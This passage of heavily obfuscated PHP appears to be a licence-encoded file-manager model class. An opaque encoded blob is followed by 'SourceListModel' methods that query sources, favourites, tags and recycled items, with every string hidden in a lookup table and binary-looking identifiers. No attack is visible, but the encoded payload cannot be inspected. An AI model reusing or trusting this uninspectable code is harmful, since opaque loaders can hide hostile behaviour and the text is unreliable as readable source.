x30\x89\x99\x75\xd7\x2b\x9c\xb\x56\x69\xcd\x34\x30\x4d\x4a\x20\xf9\x2b\x31\xc4\x25\x52\x62\xe9\x1\x20\x11\xa2\x45\x8b\x7d\xfc\x82"."\xbb\x84\x35\x65\x6f\xa\x15\x99\xf3\x63\x8f\x4\x71\x5\xc4\xcc\x17\x1e\x81\x25\xa7\xa1\x6a\xb1\x17\x2\x31\x32\xb9\x8\x69\xb3\xac\x8\x4d\xc3\xcc\x97\x78\x4d\x28\xa7\x58\xd8\xef\x4d\x37\x9b\xc5\x4a\x29\x15\x9a\x22".base64_decode('SRJE45wbB+gIIEHCiM400931DW5melR+YcgOeLDXoHUmoQE+IjNSB3rdkE/kMSVVAWINSxju')."\41\46\300\370\174\22\133\141\74\244\163\75\157\142\36\113\46\367\102\363\211\252\177\343\14\335\225\322\51\124\160\162\213\103\141\277\44\3\132\23\316\164\160\146\43\30\36\152\241\313\164\250\117\226"."\124\2\116\227\144\167\75\244\224\30\207\170\325\200\242\114\352\62\107\2\206\320\340\242\206\303\330\263\15\116\347\104\164\314\344\221\345\132\140\30\23\241\112\152\176\1\116\312\65\265\330\374\202\103"."\272\331\61\302\37\311\143\15\113\274\171\163\65\175\113\16\260\124\216\220\226\43\100\125\126\35\245\171\24\317\65\244\63\113\12\354\204\337\325\336\345\345\121\315\174\111\122\1\213\60\240\350\147\152".base64_decode('m/qwDofBoawRV0LhtqDfF2oJRhcpKXzDK7QZUXdVslRVS/iPoiuFSLPpDDCU7uNumPCnuw8d')._kodDe('MckWa/agAY6x+XgX9+sAihw/wsExUvjTInDdObQGRpAZfZwQKLkx0z8uabwcjywyUJY3P7RPbg==').strrev('™¤Ğ.ÈIs.·tĞê^(_U;tµ÷k‘•«Ë'."\r".'äo:‰¹é)ÄnrZ-Êş@Ş…')."\x11\x93\x40\x5b\x97\x2d\x73\xca\x31\xe\x1f\x31\x25\x72\x18\x3a\x7d\xb2\x31\xd9\x3c\xbb\x48\x3\x1f\xd1\xdc\xaf\x11\xd\x4a\x2e\xa\xf3\x5\xcd\xb0\x74\x29\x82\x7a\xd3\xab\x87\xa7\x7e\x5a\x26\xe3\xf0\x40\x9c\x49\x4a"."\301\242\163\133\255\330\224\112\33\140\161\204\347\235\70\103\44\330\326\36\373\37\167\325\110\10\143\212\106\202\251\260\361\207\343\324\345\221\137\366\222\315\332\24\216\265\312\143\376\247\56\36\135\342".base64_decode('MlIltuKYc1mTnKCAvadxwbBK5OeqaAIxK4WRvHwJ7E1ADdgIboA9dsIBcYTBuaAS3Ao92KLz')."\72\226\75\262\303\16\223\343\41\312\1\0\167\250\155\226\370\250\54\125\370\167\170\240\54\153\203\170\65\242\151\53\360\50\120\316\136\61\46\24\342\352\361\242\150\151\112\205\16\240\144\105\110\304"."\170\6\245\111\251\243\336\124\271\207\52\145\76\63\217\41\32\40\106\33\3\331\274\355\70\364\267\313\317\177\244\51\141\263\244\312\373\340\74\260\243\311\244\177\170\156\341\233\220\133\161\374\303\132"."\x9c\x66\x76\xa4\x2c\xc2\x21\x30\xb\xb1\x11\x70\x7d\x6a\xec\xc9\x2b\x97\x34\x65\x48\x93\xf7\x0\xf8\xd5\x17\xf5\x88\x4c\xe5\x10\x2e\x74\xf2\xd0\xed\x72\x57\x8a\xb4\xf8\xff\x4d\x41\x9a\x18\x95\xec\x15\x3b\x2b\x29\xef"."\x90\x55\xba\x4d\xf2\x2d\xce\xf1\x74\x81\xb8\x8c\x4c\x9b\x43\x4e\x9f\xc9\x38\x46\xe2\xd0\xd8\x73\x9\xa9\xbc\xb4\xc6\x88\xb9\x7\xd9\xa3\xa5\xe3\xc5\x84\xc3\x5b\x19\x4d\x50\x8a\x39\x7c\x65\x81\xc8\x11\xcc\x3e\x56\x14"."\x62\xa7\x5e\x92\x59\x6a\x7b\xa\xfd\xe9\x81\x5f\x73\x82\x4e\x50\x4a\x7\x4d\xd6\x72\x64\xf4\xa7\x8d\x4c\xa2\xc0\x15\xc2\x44\x44\x87\x2e\x44\x11\xa4\x14\x22\x2d\x79\x2d\x27\x39\xd2\x74\xfa\x8\x45\xe3\xa8\xe4\x3a\x14"."\233\174\165\172\246\23\16\377\304\346\353\164\200\306\365\16\54\261\210\54\333\341\162\57\146\306\264\224\213\342\64\46\213\42\324\74\42\177\313\32\377\144\24\50\221\211\13\305\213\341\5\54\306\105"."\x3c\xc2\x52\x6a\x58\xea\x27\x4e\x5a\x95\x9c\xe8\xca\xaf\x62\x52\xc4\x32\x29\x68\x28\x96\x3c\xe5\x4e\x19\x3a\xdb\x38\x1c\xd9\x68\x94\x57\xcb\xe7\xc5\x85\x89\xbc\xcf\xa2\x7f\x1d\x4f\xc5\x21\xad\x3b\xd6\xae\x12\xfb\x2a"."\x2a\x55\x9e\x88\xa\x3c\x93\x2e\x31\x69\x24\x5c\x68\x16\x73\x41\x7a\x71\xe3\x88\x2d\x48\x27\x43\xd9\xd6\x37\xbd\xcc\x11\xef\x88\x21\x3b\xea\x67\x17\xbd\xf5\x5\x80\xc9\x55\xb2\x9b\x78\x2e\x7c\x47\x54\x88\x1f\xa0\xbd"."\345\67\367\130\235\15\150\12\126\37\142\172\133\375\46\71\200\171\344\243\33\144\120\346\63\313\70\210\271\164\13\314\160\254\152\214\111\210\255\246\356\167\11\331\220\51\137\345\130\302\160\23\352\352"."\6\102\301\36\327\322\275\16\133\253\140\366\157\63\374\250\305\275\0\113\101\276\12\234\76\15\351\162\41\77\55\172\222\237\243\160\130\260\24\262\221\51\241\56\124\352\267\267\334\7\61\363\67\314"."\xd6\x1b\x38\x1b\xae\xe0\x41\x78\x42\x7\xc4\x2e\xf1\xe6\xfc\xf3\x5c\x25\x8a\x17\xce\x79\x34\x97\x4e\x6f\xd2\x9c\x21\xe1\xc7\x96\xb2\x93\x4f\xe9\xa1\x87\x4f\x46\x49\x81\x48\xe9\x84\xc5\xcc\x72\xb1\xb5\x50\x8e\x70\xb8".strrev('ga}ò›1#ÚSû„d.îCÈÎ8„­	ÒÆã‡f—¢³5L\\DôEÆBÅÜi²ÅÜ°ô'."\r".'F–G').strrev('	VÀæ7b0f«‹ôÄbË+œÏ¦&Ï-#¶]Ï5$Áâ±«3f—ª]_~q¶dœ&/9'."\r".'à')."\x84\x52\x1c\x20\x74\x29\xcc\x26\xb8\x4c\x7a\x48\xa2\xf3\x51\x50\xb9\x3b\x71\x55\x4b\x3a\xa4\xd4\x25\x5b\xd0\xff\x6c\xf1\x89\xf3\xf\xcd\x2a\x9b\x6e\xa2\xe\x98\xcd\xc\x3e\x86\x67\xb1\xd8\xdf\x2e\x68\xce\xa3\x66\x85"."\x13\x15\xdb\xcf\x9\xc\x2b\xfa\x22\x95\xf6\x57\x57\xd9\x5e\xeb\xe2\xce\xa1\xd9\x5a\xe6\x10\x86\x25\x9e\x33\xe2\xfd\xc4\xb2\xf\x69\x41\x1b\x44\x3b\x62\xc1\x65\xe9\xc3\x2e\xa\x40\x97\x7c\xed\x4d\x8f\x4d\x42\x9b\xc"."\xf\x86\xa3\x2d\x29\x29\x6d\x1a\xe2\xc\x57\x61\xb8\x18\x44\xe2\xe8\x41\x3a\x29\xc8\x11\x85\x2a\xdb\xf\x9d\xca\x66\xb6\xd6\x47\xbc\xb8\x1b\xec\x4d\x17\xa1\x13\x92\x5e\x21\x79\x83\xc7\xab\xc2\x66\x41\xc4\xaa\xe6\x53"."\x5a\x9\x90\x25\xad\x51\xcc\x36\xb1\x62\x97\x25\x51\x4a\x67\xd\x74\x6\x2a\x20\x88\xc4\xd1\x38\x28\x5a\xb\x3f\x89\x63\x21\xbc\x8\x39\x7\x9\xf2\x32\x91\x2c\x9d\x9e\x2b\x1f\xb7\x31\x2c\x89\x88\x3a\x9c\xcb\x8c\x54"."\32\172\205\41\174\16\136\263\303\257\367\14\321\165\111\153\311\71\101\45\275\240\34\65\307\231\62\177\351\156\315\166\313\204\113\310\174\165\73\114\300\15\104\126\210\33\112\132\100\31\105\251\136\227"."\x32\x51\xa6\xb2\x87\xc4\xb2\x3f\x74\x61\x7f\x53\xe2\xa2\x71\x69\x66\x76\x60\x2\xf9\xc\xa3\xee\xb2\xa7\x77\x3b\x2d\xce\x97\x94\x32\x39\xa8\x94\xe4\x43\x40\x7e\x63\x4d\x2a\x92\x51\xb7\xbc\x6a\xc9\x69\xb5\x90\xdd\x11"."\141\37\14\2\150\27\121\137\41\357\361\175\155\374\215\276\46\351\160\72\5\212\152\51\55\300\270\42\206\140\233\362\267\344\14\35\155\227\141\366\374\5\165\307\41\30\100\141\201\22\22\171\116\224"."\x44\x32\x98\x91\x5\xc8\x3b\x40\x4f\x12\x53\xe1\xc\x21\x5b\x82\x70\x1c\x45\xb9\x57\x5f\xc7\xd1\xd4\x2a\x75\xed\x8d\x98\x6e\x87\xaf\x9f\x84\x60\x64\x80\xea\xc1\x2e\x41\x5e\x3b\xd2\xd6\x24\x1e\x45\xb0\x23\xe2\xab\xb3"."\230\25\1\111\60\117\316\266\74\321\141\60\3\233\231\54\131\335\314\14\7\266\152\42\137\242\122\373\366\364\233\35\272\376\327\136\255\377\137\71\263\236\131\307\256\120\370\133\111\102\202\131\240\15".strrev('Z}34ÀaF§ÊX‘“-O;±ªE3(æÌ'."\0".'×ó	h(3Áf…ÈTÉÈ—ã•;)Í©|mĞ@Î')._kodDe('Kne1pmTvk6OdHAjIcckRrobb0DgJgpiXFnpMH9D+HJ+CQEhwajyCUkCEFiKYFwi2yTMJpxXnjw==').base64_decode('LJbUsQpCGnbQEWSObe8lkCCq004PFxJvV5ZNdB+xgFx7m33FMctBzBXBNMgGJcJ5Jgiohc2k')."\xf7\xc\x46\xd\x89\x19\x1b\x20\x8a\x32\x21\x74\x44\x95\x91\xcf\x98\x63\x72\x1d\x91\xf2\xbc\x9\x1a\xe7\x71\xda\xcf\x82\x12\x1d\x25\x7e\xd9\x69\x26\x4b\x86\xad\xd3\x26\x86\xa4\x9f\x5b\xae\x14\x53\x5e\x13\xa7\x32\x72".strrev('®X&yÅĞËË¸(^ä™Å˜X"ê´"ES¦ü9s½MÜuIwzˆ’îu‡NLSÄØ)Ã²ü').strrev('—P8XèûŠfk'."\r".'f; Œí”ñOFRóK¨RO€¹c;sÂLu'."\n".'Œ/âæ”ï©•')."\xb1\x21\x94\xe0\x59\x81\x6e\x66\x17\xdc\x30\x89\x33\x1e\x56\x65\x77\x47\xd\x79\xe4\x8\x8b\x1\x1d\x26\x5b\x4d\x81\x56\x3a\x22\x95\x92\xf8\x5e\x18\xb7\xb6\xb3\x79\x3f\xbf\x3d\x77\xbe\x84\x97\xde\xd2\x30\xb3\x70\xb2".base64_decode('QNmZGb+Dcq7LBZWyxc2CVXa8YImY4TZRaoTJQ5JMBaY7h1a3Hrf1hIK5Bsc5acWMuum9n1cd')."\112\347\71\147\174\101\116\70\260\105\247\273\231\66\67\313\123\261\234\111\15\70\125\112\103\110\32\265\35\330\44\234\76\225\72\173\162\72\167\152\224\44\335\324\157\226\303\53\134\331\44\165\232\176".base64_decode('wc+UpGF6MXEqlhZwXQHmwgdrR3qxFTn86sdLEBEuKJarWZUphmEZjRDVETJcfs6GluzCSLgQ')."\311\166\226\331\136\164\76\340\223\312\223\263\30\225\311\71\104\163\240\375\41\107\111\332\20\350\110\233\160\72\0\44\211\44\232\331\252\207\32\244\373\174\247\72\5\177\51\135\266\377\26\215\220\224".base64_decode('TEoxm8foF9t0CAorXySZXlb6Ss+YUqluh/hAUr6IE2ISKL9rFyoAElPLimH5g2AsSuIl4iu2').strrev('Ò®8˜dêKåHµŒ+XÈåxŸ!Öä‡ÒÑ¼EŒd¾,%g†(œÊ&²ƒj´H—8âè°PmJ').base64_decode('8AkxdBaXjcFwpBJR1A0a11SSpCBYs0uoMNGhcIGcaNJpeoZn43OG8pDXmm5HbMk5Hss+GR9a')."\x92\x4\xd2\x40\xa9\xfa\x8a\x42\x43\x9\x5\xf4\x4c\x48\xaa\x4e\xd6\xbd\x98\xb0\x40\xb4\x72\x23\x2\x2b\x9d\x20\x96\x6c\xf6\x88\x4\xc6\xe9\x98\xe\xe0\x4b\xdb\x1b\x1f\x18\xe4\x8c\xc8\x89\x8e\xee\x54\x40\xd\x76\x34"."\221\145\330\345\211\146\46\203\157\323\47\110\246\352\330\322\146\134\236\103\210\272\151\207\310\341\133\54\34\32\231\45\262\53\232\346\163\46\321\374\172\11\334\344\2\245\60\245\45\34\136\107\345\370"."\x21\xc3\x8e\xa7\x25\x49\x41\x79\x62\x79\x7c\xa1\x6c\x9a\xa1\x3\x95\xc7\x51\xda\x5b\x36\xcb\xa5\x9a\x5a\xa2\x92\xb2\xfe\x48\x6a\x64\x31\xb3\x42\x19\xda\xa3\x8a\xc5\x68\x12\x2e\x29\x8e\x65\x8e\xb2\x13\x80\x0\x97\xa5"."\x49\xb8\x6c\x59\x32\x2b\x5c\x6\x57\x52\xce\xd6\x8a\xd6\x4\xc3\x2b\x7\x1e\xc8\x44\x13\x15\x6\x2c\x64\x8d\x52\xd6\x89\xe0\x59\x31\x73\x79\x73\xb0\x6\x4a\x73\x13\xc9\x5b\xe5\x5e\x48\xa2\x49\xa7\x46\x4f\xa5\x5e\x54"."\314\74\141\57\112\163\13\176\10\37\302\53\245\124\134\240\340\304\240\302\216\301\122\52\354\21\224\376\115\250\42\47\324\306\312\67\53\221\126\101\211\215\66\211\71\63\331\326\151\205\144\131\43\256".base64_decode('ss5cpCJ9s5zKbCXxDivXlCTRAFN0LegD8vtmrugpakQMZMboFxrF7OXRFMc2V8z150y+dSaE')."\x16\x39\xe6\xfb\x7c\x85\xd2\x99\x28\xab\xcd\xb9\x38\x72\x45\xc9\x19\x43\xc5\x87\x50\x2e\x2c\x4b\x2b\x97\x53\x65\x34\xfe\xaa\x55\x68\x59\x52\x31\x80\x89\x4e\xac\xba\xd3\xe3\x83\x6c\x91\x91\xa6\xb3\x46\x32\x42\xa\x5e"."\x7a\x57\x21\x24\x7b\xe\x2d\xac\x4a\x82\x7d\x1c\x45\x3f\x3d\xe2\x6a\x8f\xd6\x27\x31\x6e\x2\x6b\x1c\x6f\x16\x29\xbb\x4\xf7\xa8\x54\x1f\xc3\x8f\x2f\x4b\xf9\xdd\x3b\xb9\xa9\xa0\xec\x5\x4d\x8e\x9a\x5\xdb\x85\xd3\x62"."\x66\x9e\xfc\x36\x9b\xb6\x2d\x54\x9a\xd8\xbd\x9\x3a\x24\x60\x1e\xc1\x25\x69\xec\xa1\x2f\x71\xe9\x8e\x3b\x45\xae\x70\x9\x62\xd3\x9b\xf\xfc\x9\x9a\x21\x58\x18\x15\xd5\x69\x2a\xa1\x84\x8e\x0\xbe\x1a\xe6\x1\x99\x5"."\200\213\337\326\142\211\16\213\210\350\67\23\175\346\60\263\103\212\360\112\2\222\270\363\3\174\223\225\14\211\25\35\313\113\123\274\340\103\314\115\56\141\300\107\262\147\165\76\345\50\116\35\265\362"."\327\2\237\127\3\134\100\210\52\250\3\41\42\141\206\207\223\321\130\264\54\251\313\27\215\56\15\107\132\250\277\241\262\144\122\112\322\336\54\113\352\152\17\167\116\224\26\350\360\5\103\145\151\130"."\xd1\xb3\x53\x15\x86\x6b\x69\x52\xb0\x8b\xf4\x92\xe8\x3b\x4c\xd4\x8b\xa0\x7f\x91\xe8\x9\xbb\x10\xd\x81\x9f\x59\x31\x9\xd2\x5\x61\x3e\x6d\xb2\x7b\x3e\x96\x3f\xaa\x31\xc7\xf0\xf2\x55\x98\x9e\x15\x76\x8c\x45\x19\xa7".base64_decode('JE6+LrOYwXH+4fQJWqJZ7VQMYpgL1WL9zU5oKZKHWOyjiRMAfsgQKkQeh3aSFE8WCaE60tqV')."\267\174\162\201\314\5\164\44\171\152\105\340\125\270\307\224\225\263\160\252\0\16\356\346\231\314\61\303\152\263\117\234\353\340\300\7\246\23\0\334\222\306\56\375\166\44\333\132\212\311\117\35\272\70"."\124\254\216\211\202\20\170\377\37\323\13\222\24\221\277\0\0".base64_decode('').""."", 10, -8))); goto C×‹»“‘Œì; c’ù§ßàÉ¸: class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\157\165\x72\x63\x65"; protected $tableMeta = array("\164\141\x62\154\x65\x4e\x61\155\145" => "\x69\157\x5f\163\157\165\x72\x63\x65\x5f\x6d\145\164\x61", "\155\145\x74\x61\106\x69\145\154\x64" => "\x73\157\x75\162\x63\x65\111\104"); protected $dataAuto = array(array("\155\x6f\x64\x69\x66\x79\124\x69\x6d\x65", "\164\x69\155\145", "\x69\x6e\x73\145\162\164", "\146\165\x6e\x63\164\151\x6f\x6e"), array("\143\162\145\141\164\x65\x54\x69\x6d\x65", "\x74\x69\x6d\x65", "\151\156\x73\145\x72\164", "\146\x75\x6e\143\164\x69\x6f\156"), array("\166\151\145\167\x54\x69\x6d\x65", "\x74\151\155\x65", "\151\156\x73\145\x72\x74", "\x66\x75\156\143\164\x69\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($„Ãê¡Â) { return $this->listSource(array($_SERVER[¬ÏÕ§Áú][497] => $„Ãê¡Â)); } public function typeName($Ú´•ıÍ) { static $˜†ƒõ«Ë = array(self::TYPE_SYSTEM => "\163\171\163\164\145\155", self::TYPE_USER => "\x75\163\x65\x72", self::TYPE_GROUP => "\147\162\157\165\x70"); return $˜†ƒõ«Ë[$Ú´•ıÍ . $_SERVER[¬ÏÕ§Áú][12]]; } public function sourceListInfo($´ãÄÎ—Â, $›İçíŒõ = false) { $¼¶àôÔ‰ =& $_SERVER[¬ÏÕ§Áú]; $´ãÄÎ—Â = $´ãÄÎ—Â ? $´ãÄÎ—Â : array(); $´ãÄÎ—Â = array_filter(array_unique($´ãÄÎ—Â)); if (!$´ãÄÎ—Â) { return array(); } $¯»§Ò­± = $this->where(array($¼¶àôÔ‰[204] => array($¼¶àôÔ‰[7], $´ãÄÎ—Â)))->select(); $this->_listDataApply($¯»§Ò­±, $›İçíŒõ); return array_to_keyvalue($¯»§Ò­±, $¼¶àôÔ‰[204]); } public function pathInfoFilter(&$ñ–¼•°À) { $Ö¼í¾Ö× =& $_SERVER[¬ÏÕ§Áú]; static $¶”ï—€« = false; static $ÙŸ¾§ÓÎ = false; static $æšÔıÛÜ = false; if (!$¶”ï—€«) { $òËâûá = $Ö¼í¾Ö×[498]; $òËâûá .= $Ö¼í¾Ö×[499]; $òËâûá .= $Ö¼í¾Ö×[500]; $Á§Óş±Ñ = $Ö¼í¾Ö×[501]; $›¦ˆĞå = explode($Ö¼í¾Ö×[50], $Á§Óş±Ñ); $¶”ï—€« = explode($Ö¼í¾Ö×[50], $òËâûá); $ÙŸ¾§ÓÎ = array(); foreach ($¶”ï—€« as $Úşù•œº) { if (in_array($Úşù•œº, $›¦ˆĞå)) { continue; } $ÙŸ¾§ÓÎ[] = $Úşù•œº; } $æšÔıÛÜ = explode($Ö¼í¾Ö×[50], $Ö¼í¾Ö×[502]); } foreach ($æšÔıÛÜ as $‚³¢Ó¦à) { if (isset($ñ–¼•°À[$‚³¢Ó¦à])) { $ñ–¼•°À[$‚³¢Ó¦à] = intval($ñ–¼•°À[$‚³¢Ó¦à]); } } $ñ–¼•°À[$Ö¼í¾Ö×[97]] = $Ö¼í¾Ö×[503] . $ñ–¼•°À[$Ö¼í¾Ö×[204]] . $Ö¼í¾Ö×[504]; $ñ–¼•°À[$Ö¼í¾Ö×[33]] = $ñ–¼•°À[$Ö¼í¾Ö×[505]] == 1 ? $Ö¼í¾Ö×[88] : $Ö¼í¾Ö×[243]; $ñ–¼•°À[$Ö¼í¾Ö×[201]] = $this->typeName($ñ–¼•°À[$Ö¼í¾Ö×[201]]); if ($ñ–¼•°À[$Ö¼í¾Ö×[505]] != 1) { $ñ–¼•°À[$Ö¼í¾Ö×[179]] = $ñ–¼•°À[$Ö¼í¾Ö×[506]]; unset($ñ–¼•°À[$Ö¼í¾Ö×[506]]); } $“³Ø¶Ïµ = $¶”ï—€«; if (isset($ñ–¼•°À[$Ö¼í¾Ö×[507]]) && $ñ–¼•°À[$Ö¼í¾Ö×[507]][$Ö¼í¾Ö×[508]] == -1) { $“³Ø¶Ïµ = $ÙŸ¾§ÓÎ; } $ñ–¼•°À = array_field_key($ñ–¼•°À, $“³Ø¶Ïµ); return $ñ–¼•°À; } public function listUserFav() { $ì÷¡´¦  =& $_SERVER[¬ÏÕ§Áú]; $«ÍÅç¦« = Model($ì÷¡´¦ [509])->listData(); $™ï·ËŸÕ = array_filter_by_field($«ÍÅç¦«, $ì÷¡´¦ [33], $ì÷¡´¦ [510]); $™ï·ËŸÕ = array_to_keyvalue($™ï·ËŸÕ, $ì÷¡´¦ [12], $ì÷¡´¦ [97]); if ($™ï·ËŸÕ) { $÷ÃÉÃêš = $this->listSource(array($ì÷¡´¦ [511] => array($ì÷¡´¦ [512], $™ï·ËŸÕ))); } $÷ÃÉÃêš = array_to_keyvalue($÷ÃÉÃêš[$ì÷¡´¦ [456]], $ì÷¡´¦ [204]); foreach ($«ÍÅç¦« as &$ÕÅ±Œš–) { $ÕÅ±Œš– = array($ì÷¡´¦ [513] => $ÕÅ±Œš–[$ì÷¡´¦ [492]], $ì÷¡´¦ [514] => $ÕÅ±Œš–[$ì÷¡´¦ [32]], $ì÷¡´¦ [515] => $ÕÅ±Œš–[$ì÷¡´¦ [97]], $ì÷¡´¦ [516] => $ÕÅ±Œš–[$ì÷¡´¦ [33]], $ì÷¡´¦ [517] => $ÕÅ±Œš–[$ì÷¡´¦ [244]], $ì÷¡´¦ [518] => $ÕÅ±Œš–[$ì÷¡´¦ [98]]); if ($ÕÅ±Œš–[$ì÷¡´¦ [33]] == $ì÷¡´¦ [510] && $÷ÃÉÃêš[$ÕÅ±Œš–[$ì÷¡´¦ [97]]]) { $ÕÅ±Œš–[$ì÷¡´¦ [100]] = $÷ÃÉÃêš[$ÕÅ±Œš–[$ì÷¡´¦ [97]]]; } } unset($ÕÅ±Œš–); return $«ÍÅç¦«; } public function listUserTag($ëãÎ™”‹) { $Äˆ×æª =& $_SERVER[¬ÏÕ§Áú]; if ($ëãÎ™”‹ && !is_array($ëãÎ™”‹)) { $ëãÎ™”‹ = array($ëãÎ™”‹); } $íµÄÖ¹‰ = Model($Äˆ×æª[519])->listData(); $Ü‡õÕÚÏ = array(); $ÄıáÀÅÁ = array(); foreach ($íµÄÖ¹‰ as $À½ÃÔ¢½) { $Ëåùè¦î = $À½ÃÔ¢½[$Äˆ×æª[97]]; if (!$Ëåùè¦î) { continue; } if (!isset($ÄıáÀÅÁ[$Ëåùè¦î])) { $ÄıáÀÅÁ[$Ëåùè¦î] = array(); } $ÄıáÀÅÁ[$Ëåùè¦î][] = $À½ÃÔ¢½[$Äˆ×æª[520]]; $Ü‡õÕÚÏ[$À½ÃÔ¢½[$Äˆ×æª[97]]] = $À½ÃÔ¢½; } $›üöíÚ = array(); $ã²…ã é = array(); $†‡Ü©ê† = array(); foreach ($ÄıáÀÅÁ as $Âşø±¡” => $ìäî÷¸Û) { $ŠÇ†Ş€£ = !0; if (!$ëãÎ™”‹) { $›üöíÚ[] = $Âşø±¡”; continue; } foreach ($ëãÎ™”‹ as $Á »ìÎŒ) { if (!in_array($Á »ìÎŒ, $ìäî÷¸Û)) { $ŠÇ†Ş€£ = !1; break; } } if (!$ŠÇ†Ş€£) { continue; } if (!is_numeric($Âşø±¡”)) { $Ùç€ªß = $Ü‡õÕÚÏ[$Âşø±¡”]; $‰³¤Æ›² = array($Äˆ×æª[32] => $Ùç€ªß[$Äˆ×æª[32]], $Äˆ×æª[97] => $Ùç€ªß[$Äˆ×æª[97]], $Äˆ×æª[33] => $Ùç€ªß[$Äˆ×æª[33]], $Äˆ×æª[100] => array($Äˆ×æª[521] => 1), $Äˆ×æª[245] => !0); if ($Ùç€ªß[$Äˆ×æª[33]] == $Äˆ×æª[243]) { $†‡Ü©ê†[] = $‰³¤Æ›²; } if ($Ùç€ªß[$Äˆ×æª[33]] == $Äˆ×æª[88]) { $ã²…ã é[] = $‰³¤Æ›²; } continue; } $›üöíÚ[] = $Âşø±¡”; } if ($›üöíÚ) { $¿å¼œÏ = $this->listSource(array($Äˆ×æª[511] => array($Äˆ×æª[512], $›üöíÚ))); } $¿å¼œÏ = $¿å¼œÏ ? $¿å¼œÏ : array($Äˆ×æª[95] => array(), $Äˆ×æª[96] => array()); $¿å¼œÏ[$Äˆ×æª[95]] = array_merge($¿å¼œÏ[$Äˆ×æª[95]], $ã²…ã é); $¿å¼œÏ[$Äˆ×æª[96]] = array_merge($¿å¼œÏ[$Äˆ×æª[96]], $†‡Ü©ê†); if (isset($¿å¼œÏ[$Äˆ×æª[453]]) && count($›üöíÚ) == $¿å¼œÏ[$Äˆ×æª[453]][$Äˆ×æª[454]]) { return $¿å¼œÏ; } $Ü×Ç˜äÅ = array(); $ıÕ®æ = array_to_keyvalue($¿å¼œÏ[$Äˆ×æª[95]], $Äˆ×æª[12], $Äˆ×æª[204]); $È´¿ÀÕ = array_to_keyvalue($¿å¼œÏ[$Äˆ×æª[96]], $Äˆ×æª[12], $Äˆ×æª[204]); $‡Ñ­ûĞÀ = array_merge($È´¿ÀÕ, $ıÕ®æ); foreach ($›üöíÚ as $Ëåùè¦î) { if (!in_array($Ëåùè¦î, $‡Ñ­ûĞÀ)) { $Ü×Ç˜äÅ[] = $Ëåùè¦î; } } if ($Ü×Ç˜äÅ) { Model($Äˆ×æª[522])->removeBySource($Ü×Ç˜äÅ); } return $¿å¼œÏ; } public function listUserRecycle() { $´üœÖ£ =& $_SERVER[¬ÏÕ§Áú]; $ãú¾ÑÈ = Model($´üœÖ£[523])->listData(); if (!$ãú¾ÑÈ) { return array(); } $¨ºğ£§˜ = array($´üœÖ£[511] => array($´üœÖ£[512], $ãú¾ÑÈ), $´üœÖ£[524] => 1); return $this->listSource($¨ºğ£§˜); } public function listSource($Ïü¹ÃŞ, $î³ÏÚº = 3000, $Î¹÷‰Ã× = false) { $Åİ±ÎÑ =& $_SERVER[¬ÏÕ§Áú]; if (!isset($Ïü¹ÃŞ[$Åİ±ÎÑ[525]])) { $Ïü¹ÃŞ[$Åİ±ÎÑ[525]] = 0; } if (isset($Ïü¹ÃŞ[$Åİ±ÎÑ[203]]) && $Ïü¹ÃŞ[$Åİ±ÎÑ[203]] == $Åİ±ÎÑ[241]) { $Ïü¹ÃŞ[$Åİ±ÎÑ[506]] = array($Åİ±ÎÑ[473], $Åİ±ÎÑ[12]); } if (isset($Ïü¹ÃŞ[$Åİ±ÎÑ[203]])) { $Ïü¹ÃŞ[$Åİ±ÎÑ[203]] = intval($Ïü¹ÃŞ[$Åİ±ÎÑ[203]]); } $»‹‡‰Ã = $Åİ±ÎÑ[526]; $ßûÈØ£ş = $this->field($»‹‡‰Ã)->_makeOrder()->where($Ïü¹ÃŞ)->selectPage($î³ÏÚº); $this->_listPageCheck($ßûÈØ£ş, $»‹‡‰Ã, $Ïü¹ÃŞ); $this->_listDataApply($ßûÈØ£ş[$Åİ±ÎÑ[456]], $Î¹÷‰Ã×); $this->_listMake($ßûÈØ£ş); return $ßûÈØ£ş; } private function _listPageCheck(&$§š§³Ò, $¢é©ó‘½, $Şß×É‡´) { $¬—¯¸÷Ñ =& $_SERVER[¬ÏÕ§Áú]; if (!is_array($§š§³Ò[$¬—¯¸÷Ñ[453]])) { return; } $‹–ÃÆú× = $§š§³Ò[$¬—¯¸÷Ñ[453]]; if ($‹–ÃÆú×[$¬—¯¸÷Ñ[455]] <= 1) { return; } if ($‹–ÃÆú×[$¬—¯¸÷Ñ[454]] >= 100000) { return; } if (Model($¬—¯¸÷Ñ[527])->get($¬—¯¸÷Ñ[528]) != $¬—¯¸÷Ñ[529]) { return; } $¢é©ó‘½ = str_replace(array($¬—¯¸÷Ñ[53], $¬—¯¸÷Ñ[428], $¬—¯¸÷Ñ[65]), $¬—¯¸÷Ñ[12], $¢é©ó‘½); $¢é©ó‘½ = $¬—¯¸÷Ñ[530] . str_replace($¬—¯¸÷Ñ[50], $¬—¯¸÷Ñ[531], $¢é©ó‘½) . $¬—¯¸÷Ñ[532]; $£·Ûã¼ = $¬—¯¸÷Ñ[533]; $£·Ûã¼ = $£·Ûã¼ . $¬—¯¸÷Ñ[534]; $Å½äš’ = $‹–ÃÆú×[$¬—¯¸÷Ñ[450]] * ($‹–ÃÆú×[$¬—¯¸÷Ñ[439]] - 1) . $¬—¯¸÷Ñ[50] . $‹–ÃÆú×[$¬—¯¸÷Ñ[450]]; $±õ¥ŒÕ¢ = $this->_makeOrder(!0); $ë©ÚêÀˆ = $¬—¯¸÷Ñ[530] . str_replace($¬—¯¸÷Ñ[50], $¬—¯¸÷Ñ[531], $±õ¥ŒÕ¢[0]); if (strpos($ë©ÚêÀˆ, $¬—¯¸÷Ñ[535])) { $ë©ÚêÀˆ = str_replace($¬—¯¸÷Ñ[535], $¬—¯¸÷Ñ[536], $ë©ÚêÀˆ); } else { $ë©ÚêÀˆ .= $¬—¯¸÷Ñ[537] . $±õ¥ŒÕ¢[1]; } $¡õÚªï˜ = array(); foreach ($Şß×É‡´ as $ÍÙÑĞÉú => $¬«Åº¸ã) { $¡õÚªï˜[$¬—¯¸÷Ñ[530] . $ÍÙÑĞÉú] = $¬«Åº¸ã; } $this->alias($¬—¯¸÷Ñ[538])->field($¢é©ó‘½)->limit($Å½äš’)->order($ë©ÚêÀˆ); $‚•ÕúÙÊ = $this->join($£·Ûã¼)->where($¡õÚªï˜)->select(); if ($‚•ÕúÙÊ) { $§š§³Ò[$¬—¯¸÷Ñ[456]] = $‚•ÕúÙÊ; 